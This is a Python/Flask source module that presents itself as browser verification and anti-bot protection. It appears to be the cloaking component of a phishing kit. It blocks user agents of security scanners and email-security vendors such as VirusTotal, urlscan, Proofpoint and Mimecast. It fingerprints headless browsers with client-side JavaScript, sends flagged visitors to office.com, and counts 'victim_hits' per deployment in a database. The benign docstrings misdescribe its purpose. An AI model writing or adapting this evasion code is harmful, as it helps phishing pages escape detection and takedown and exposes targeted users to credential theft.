"""
core/stealth_gate.py - Client-Side Browser Verification & Anti-Bot Protection Engine
Provides automated crawler filtering, headless browser detection, and client environment validation.
"""

import hmac
import hashlib
import time
import json
import os
from pathlib import Path
from functools import wraps
from flask import request, redirect, jsonify, render_template_string, make_response
from config import Config

GATE_SECRET_KEY = getattr(Config, 'GATE_SECRET', 'CRIMSON_PAW_STEALTH_GATE_SECRET_2026')
TOKEN_TTL_SECONDS = 7200  # 2 Hours validity once verified
SETTINGS_PATH = Path(__file__).resolve().parent.parent / 'settings.json'

KNOWN_BOT_USER_AGENTS = [
    'bot', 'crawl', 'spider', 'slurp', 'mediapartners', 'facebookexternalhit',
    'python-requests', 'aiohttp', 'curl', 'wget', 'httpx', 'headless', 'phantomjs',
    'selenium', 'puppeteer', 'playwright', 'urlscan', 'virustotal', 'censys', 'shodan',
    'netcraft', 'barracuda', 'proofpoint', 'mimecast', 'zscaler', 'symantec'
]

def is_gate_enabled():
    """Check if the Stealth Gate is toggled on in settings.json."""
    if SETTINGS_PATH.exists():
        try:
            with open(SETTINGS_PATH, 'r', encoding='utf-8') as f:
                cfg = json.load(f)
                return cfg.get('stealth_gate_enabled', True)
        except Exception:
            pass
    return True

def get_fallback_url():
    """Retrieve configured fallback redirect URL."""
    if SETTINGS_PATH.exists():
        try:
            with open(SETTINGS_PATH, 'r', encoding='utf-8') as f:
                cfg = json.load(f)
                return cfg.get('default_redirect', 'https://www.office.com/')
        except Exception:
            pass
    return getattr(Config, 'FALLBACK_URL', 'https://www.office.com/')

def generate_gate_token(client_ip, user_agent):
    """Generate a signed, tamper-proof HMAC verification token."""
    expiry = int(time.time()) + TOKEN_TTL_SECONDS
    payload = f"{client_ip}:{user_agent[:40]}:{expiry}"
    signature = hmac.new(GATE_SECRET_KEY.encode(), payload.encode(), hashlib.sha256).hexdigest()
    return f"{payload}:{signature}"

def verify_gate_token(token, client_ip, user_agent):
    """Validate token integrity, client binding, and expiration."""
    if not token or ':' not in token:
        return False
    try:
        parts = token.split(':')
        if len(parts) != 4:
            return False
        ip, ua_sub, expiry_str, signature = parts
        expiry = int(expiry_str)
        if time.time() > expiry:
            return False
        if ip != client_ip:
            return False
        expected_payload = f"{ip}:{ua_sub}:{expiry}"
        expected_sig = hmac.new(GATE_SECRET_KEY.encode(), expected_payload.encode(), hashlib.sha256).hexdigest()
        return hmac.compare_digest(signature, expected_sig)
    except Exception:
        return False

def is_known_bot(user_agent):
    """Check if User-Agent header matches known automated scanners."""
    if not user_agent:
        return True
    ua = user_agent.lower()
    return any(bot in ua for bot in KNOWN_BOT_USER_AGENTS)

def render_gate_challenge(target_url):
    """Render client-side browser verification page."""
    html = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            background-color: #0d1117;
            color: #c9d1d9;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
        }
        .challenge-container {
            background: #161b22;
            border: 1px solid #30363d;
            border-radius: 8px;
            padding: 36px 32px;
            max-width: 440px;
            width: 100%;
            text-align: center;
            box-shadow: 0 8px 24px rgba(0,0,0,0.4);
        }
        .spinner {
            width: 44px;
            height: 44px;
            border: 3.5px solid #21262d;
            border-top: 3.5px solid #58a6ff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        h2 { font-size: 1.15rem; font-weight: 600; color: #f0f6fc; margin-bottom: 8px; }
        p { font-size: 0.88rem; color: #8b949e; line-height: 1.5; margin-bottom: 20px; }
        .secure-badge {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            font-size: 0.75rem;
            color: #3fb950;
            background: #0d281e;
            border: 1px solid #1f6feb33;
            padding: 4px 12px;
            border-radius: 20px;
            margin-top: 6px;
        }
    </style>
</head>
<body>
    <div class="challenge-container">
        <div class="spinner" id="spinner"></div>
        <h2>Checking your browser before accessing</h2>
        <p>This process is automatic. Your browser will redirect to your requested page in just a moment.</p>
        <div class="secure-badge">
            <span>🔒</span> Encrypted Cloud Verification
        </div>
    </div>

    <script>
        (function() {
            function runDiagnostics() {
                var isBot = false;
                
                // 1. WebDriver / Automation flag detection
                if (navigator.webdriver) isBot = true;
                if (window.cdc_adoQpoasnfa76pfcZLmcfl_Array || window._phantom || window.__nightmare) isBot = true;
                if (window.callPhantom || window.buffer) isBot = true;

                // 2. Headless screen geometry sanity check
                if (window.screen.width === 0 || window.screen.height === 0) isBot = true;
                if (window.outerWidth === 0 && window.outerHeight === 0) isBot = true;

                // 3. Languages check
                if (!navigator.languages || navigator.languages.length === 0) isBot = true;

                // 4. WebGL context renderer check
                try {
                    var canvas = document.createElement('canvas');
                    var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                    if (gl) {
                        var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                        if (debugInfo) {
                            var renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || '';
                            if (renderer.indexOf('SwiftShader') !== -1 || renderer.indexOf('llvmpipe') !== -1) {
                                isBot = true;
                            }
                        }
                    }
                } catch(e) {}

                // Send verification payload
                var target = {{ target_url|tojson }};
                var payload = {
                    is_bot: isBot,
                    target: target,
                    screen: [window.screen.width, window.screen.height],
                    tz: new Date().getTimezoneOffset()
                };

                setTimeout(function() {
                    fetch('/api/gate/verify', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    })
                    .then(function(res) { return res.json(); })
                    .then(function(data) {
                        if (data && data.success && data.redirect) {
                            window.location.replace(data.redirect);
                        } else {
                            window.location.replace("https://www.office.com/");
                        }
                    })
                    .catch(function() {
                        window.location.replace("https://www.office.com/");
                    });
                }, 1200);
            }

            if (document.readyState === 'complete' || document.readyState === 'interactive') {
                runDiagnostics();
            } else {
                document.addEventListener('DOMContentLoaded', runDiagnostics);
            }
        })();
    </script>
</body>
</html>"""
    return render_template_string(html, target_url=target_url)

def log_bot_hit(client_ip, user_agent, bot_type="scanner", host=None, path=None):
    """Record deflected bot hit to deployment_hits table."""
    try:
        import sqlite3
        with sqlite3.connect(Config.DB_PATH) as conn:
            dep_id = None
            if host and path:
                try:
                    path_clean = path.split('?')[0].strip('/')
                    for suffix in ['/l', '/s']:
                        if path_clean.endswith(suffix):
                            path_clean = path_clean[:-len(suffix)]
                    clean_host = host.split(':')[0].strip().lower()
                    row = conn.execute(
                        "SELECT id FROM deployments WHERE (domain=? OR domain=?) AND path=? AND status='active' ORDER BY id DESC LIMIT 1",
                        (clean_host, host, path_clean)
                    ).fetchone()
                    if not row:
                        row = conn.execute(
                            "SELECT id FROM deployments WHERE path=? AND status='active' ORDER BY id DESC LIMIT 1",
                            (path_clean,)
                        ).fetchone()
                    if row:
                        dep_id = row[0]
                except Exception:
                    pass

            conn.execute(
                "INSERT INTO deployment_hits (deployment_id, visitor_ip, visitor_ua, stage, is_bot, bot_type) VALUES (?, ?, ?, 'bot_deflected', 1, ?)",
                (dep_id, client_ip, user_agent, bot_type)
            )
            if dep_id:
                try:
                    conn.execute("UPDATE deployments SET victim_hits=victim_hits+1, bot_hits=bot_hits+1 WHERE id=?", (dep_id,))
                except Exception:
                    pass
    except Exception:
        pass

def require_human_gate(f):
    """Flask route decorator requiring verified client browser environment."""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not is_gate_enabled():
            return f(*args, **kwargs)

        client_ip = request.headers.get('CF-Connecting-IP') or request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
        user_agent = request.headers.get('User-Agent', '')

        # Deflect known automated crawlers immediately
        if is_known_bot(user_agent):
            log_bot_hit(client_ip, user_agent, bot_type="scanner_ua", host=request.host, path=request.path)
            return redirect(get_fallback_url())

        # Check existing gate token
        token = request.cookies.get('gate_token')
        if token and verify_gate_token(token, client_ip, user_agent):
            return f(*args, **kwargs)

        # Serve challenge if not yet validated
        return render_gate_challenge(request.full_path)
    return decorated_function
